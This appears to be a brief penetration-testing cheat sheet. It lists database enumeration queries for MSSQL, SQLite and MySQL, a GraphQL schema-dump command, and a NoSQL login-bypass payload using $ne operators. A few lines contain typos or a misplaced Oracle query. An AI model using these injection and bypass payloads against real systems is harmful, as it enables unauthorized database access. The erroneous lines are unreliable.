## MSSQL queries
```sql
SELECT name FROM master.dbo.sysdatabases # List databases
SELECT * FROM <database_name>.INFORMATION_SCHEMA.TABLES # List tables
SELECT table_name FROM all_tables # List tables
SELECT column_name FROM all_tab_columns WHERE table_name = '<table_name>' # List columns
```

## SQLite queries
References: https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf
```sql
SELECT tbl_name FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' # List tables
SELECT sql FROM sqlite_master WHERE type!='meta' AND SQL NOT NULL AND name NOTE LIKE 'sqlite_%' AND name='<table>' # List columns
```

## MySQL queries
```sql
SELECT schema_name FROM INFORMATION_SCHEMA.schemata # List databases
SELECT table_schema, table_name FROM INFORMATION_SCHEMA.tables WHERE table_schema !='mysql' AND table_schema!='information_schema' # List tables
SELECT table_schema, table_name, column_name FROM INFORMATION_SCHEMA.columns WHERE table_schema!='mysql' AND table_schema!='information_schema' # List columns
```

## GraphQL
Use `inql` to dump schemas: https://github.com/doyensec/inql
```bash
insql -t http://192.168.206.201/graphql -o inql-dump
```

## NoSQL
```
username[$ne]=admin&password[$ne]=admin&login=login
```